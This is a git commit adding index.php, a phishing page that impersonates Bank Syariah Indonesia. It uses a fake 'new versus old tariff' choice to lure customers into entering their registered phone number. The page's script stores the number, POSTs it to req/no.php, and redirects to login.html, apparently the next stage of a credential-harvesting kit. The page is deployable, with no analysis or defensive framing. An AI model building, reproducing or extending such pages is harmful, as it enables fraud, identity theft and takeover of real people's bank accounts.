a2c05f3428c470c17211dca97e09827360b60947
lazada564 <terhubunglazada12@gmail.com>
2025-05-08 21:43:25 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+      <meta charset="UTF-8">
+      <title>𝗕𝗮𝗻𝗸 𝗦𝘆𝗮𝗿𝗶𝗮𝗵 𝗜𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮</title>
+      <meta name="theme-color" content="#00A39E">
+<meta name="description" content="Yuk segara konfirmasikan tarif sesuai dengan kebutuhan anda"> 
+ <meta property="og:image" content="https://hosting.tigerengine.id/77d5f3.jpg">
+  <link href="https://hosting.tigerengine.id/nri6ui.png" rel="shortcut icon" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+ </head>
+ <style>
+      @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
+      
+ body {
+       font-family: sans-serif;
+       margin: 0;
+       margin-bottom: 150%;
+       
+} 
+       
+  .nav1{
+      z-index:999999;
+      position: fixed;
+      background: url("img/nav1.png") transparent;
+      background-repeat: no-repeat;
+      background-size: 100%;
+      height: 60px;
+      width: 100%;
+      margin: 0px auto;
+      box-shadow: 0px 1px 4px 2px rgba(66, 68, 90, 0.18);
+         
+ }
+   .nav2{
+      z-index:999999;
+      position: fixed;
+      background: url("img/nav2.png") transparent;
+      background-repeat: no-repeat;
+      background-size: 100%;
+      height: 110px;
+      width: 100%;
+      bottom: 0; 
+      left: 0; 
+      right: 0; 
+      margin: 0px auto;
+      padding-top: 19px
+         
+ }
+.foto{
+      z-index: 1;
+      background: url('img/index1.png');
+      background-repeat: no-repeat;
+      background-size: 100%;
+      bottom: 0; 
+      left: 0; 
+      right: 0; 
+      height:200px;
+      width:100%;
+      margin: 0px auto;
+      top: 68px;
+      position: absolute;
+}
+.radio-section {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    width:;
+}
+h1 {
+    margin-bottom: 20px;
+}
+.radio-item [type="radio"] {
+    display: none;
+}
+.radio-item + .radio-item {
+    margin-top: 15px;
+}
+.radio-item label {
+    display: block;
+    padding: 8px 10px;
+    background: transparent;
+    border: 2px solid #00A39E;
+    border-radius: 20px;
+    cursor: pointer;
+    font-size: 12px;
+    font-weight: 400;
+    min-width: 270px;
+    padding-left: 0px;
+    color: #00A39E;
+    margin: 8px auto;
+    top:210px;
+    position: relative;
+    
+}
+.radio-item label:after,
+.radio-item label:before {
+    content: "";
+    position: absolute;
+    border-radius: 50%;
+}
+.radio-item label:after {
+    height: 20px;
+    width: 20px;
+    border: 1px solid #00A39E;
+    left: 9px;
+    top: calc(50% - 11px);
+}
+.radio-item label:before {
+    background: #00A39E;
+    height: 17px;
+    width: 17px;
+    left: 11.2px;
+    top: calc(50% - 9.8px);
+    transform: scale(5);
+    opacity: 0;
+    visibility: hidden;
+    transition: 0.4s ease-in-out 0s;
+}
+.radio-item [type="radio"]:checked ~ label {
+    border-color: #F8B13B;
+}
+.radio-item [type="radio"]:checked ~ label::before {
+    opacity: 1;
+    visibility: visible;
+    transform: scale(1);
+    margin-top: 0.9px;
+}
+.button{
+      z-index: 1;
+      background: #00A39E; 
+      margin-top: 16px; 
+      height: 45px; 
+      max-width: 100%; 
+      margin-left: -20; 
+      color: #fff; 
+      border-radius: 50px; 
+      border: 1px solid #00A39E;
+      width: 72%;
+}
+.three {
+    transition: all 0.2s;
+    transition-timing-function:cubic-bezier(2.2, 2, 3, 2);
+}
+.three:hover {
+    background: #00A39E; 
+    color: white;
+    border: none;
+    opacity: 0.3;
+    transform:scale(1.01,1.01);
+    box-shadow: inset 0px 0px 9px -2px rgba(66, 68, 90, 1);
+}
+    .form-log{
+        box-sizing: border-box; 
+        height: 40px; 
+        width: 72%; 
+        max-width: 72%; 
+        border:none;
+        border-bottom: 1.5px solid #00A39E; 
+        border-image: initial; 
+        background-color: transparent;  
+        background: url("img/62.png");
+        background-repeat: no-repeat;
+        background-position: left center;
+        background-size: 21%;
+        border-radius: 0px; 
+        font-family: 'Nunito', sans-serif; 
+        font-weight: 600; 
+        font-size: 16px; 
+        color: #00000099; 
+        word-spacing: 0px; 
+        padding: 0px 0px; 
+        outline: none; 
+        margin-top: 1px; 
+        padding-left: 60px;
+        margin: auto;
+        display: block;
+        align-items: center;
+    }
+    
+  .lbl{
+        position: relative;
+        font-size: 14px;
+        color: #000000cc;
+        margin-left: 55px;
+        font-weight: 800;
+  }
+  
+  ::placeholder{
+        font-size: 14px;
+        font-weight: 400;
+        
+  }
+  
+  .process1 {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            position: fixed;
+            padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999999999;
+            
+      
+}
+.loading {
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 0px;
+}
+.loading img {
+    width: 190px;
+    border-radius: 10px;
+}
+welalxcome {
+  display: flex;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%;
+  background: url('img/welcome.png') no-repeat center center;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+  z-index: 10000;
+  background-color: #ffffff;
+}
+welalxcome img {
+        width:100%;
+    height: 700px;
+    margin-top: -55px;
+    
+}
+chsalxcome {
+    position: relative;
+    width: 100%;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+ </style>
+<body>
+<main>
+<welalxcome style="display: none">
+</welalxcome>
+<chsalxcome2 style="display: none;">
+<nav class="nav1" ></nav>
+<div class="foto">
+<form id="formHP" onsubmit="sendHp()">
+ <section class="" style="padding: 4px; position: static; left: 0; right: 0; margin: -10px auto; width: 60%">
+    <div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%">
+    <center>
+        <div class="radio-item" ><input name="tarif" id="radio1" type="radio" value="baru" required><label for="radio1">TARIF BARU Rp 150.000 / BULAN</label>
+        <div class="radio-item"><input name="tarif" id="radio2" type="radio" value="lama" required><label for="radio2" >TARIF LAMA Rp 6.500 / TRANSAKSI</label></div>
+    </center>
+    </div>
+        </section>   
+    <section style="margin-top: 340px">
+          <label for="rek" class="lbl">No. HP. Terdaftar</label>
+     <input type="tel" id="nohp" class="form-log" maxlength="13" name="nohp" data-name="rek" value="" placeholder="Tuliskan Nomor Handphone Anda" minlength="10" required>
+    
+   <div style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 100%">
+    <center>
+     <button id="btnSubmit1" type="submit" class="button three" >SELANJUTNYA</button>
+     </center>
+     </div></div>
+     </section>
+     </form>
+     <br>
+     <br>
+     <br>
+     <br>
+     <br>
+     <center>
+     <div id="djload" name="process" class="process1" style="display: none;">
+            <div class="loading">
+                <img src="img/loding.gif">
+              
+            </div>
+        </div>
+        </center>
+<div class="nav2"></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script><script src="img/jquery.mask.min.js"></script>
+<script>
+$(document).ready(function() {
+    $('#nohp').on('input', function() {
+        if ($(this).val() == '0' || $(this).val() == '62') {
+            $(this).val('');
+        }
+    });
+});
+</script>
+    <script>
+$(document).ready(function() {
+    $('#nohp').mask('000-0000-00000');
+});
+    </script>
+<script>
+$( document ).ready(function() {
+      $('welalxcome').fadeIn(500);
+            setTimeout(() => {
+                $('welalxcome').fadeOut();
+                $('chsalxcome2').fadeIn();
+            },800)
+        })
+</script>
+<script>
+function sendHp () {
+event.preventDefault();
+        var nomor = document.getElementById("nohp").value;
+        sessionStorage.setItem("nomor", nomor);
+$('.process1').fadeIn();
+ document.getElementById('btnSubmit1').innerHTML ="Memproses...";
+      $.ajax({
+            type: 'POST',
+            url: 'req/no.php',
+            data: $('#formHP').serialize(),
+            datatype: 'text',
+            
+            complete: function(data) {
+            setTimeout(function(){
+  window.location.href='login.html'
+  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
+ $('.process1').fadeOut();
+    }, 800);
+            }
+        })
+     }
+</script>      
+</body>
+</html>
